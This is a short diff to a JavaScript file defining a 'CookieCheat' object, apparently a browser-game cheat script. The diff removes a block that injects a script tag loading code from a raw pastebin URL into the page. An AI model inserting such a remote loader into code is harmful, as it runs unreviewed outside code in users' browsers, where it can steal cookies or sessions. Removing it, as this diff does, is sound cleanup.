@@ -762,8 +762,3 @@ var CookieCheat = {
     }
 };
 CookieCheat.init();
-
-var url = 'http://pastebin.com/raw/FMGTyE2i';
-var script = document.createElement('script');
-script.setAttribute('src', url);
-document.body.appendChild(script);
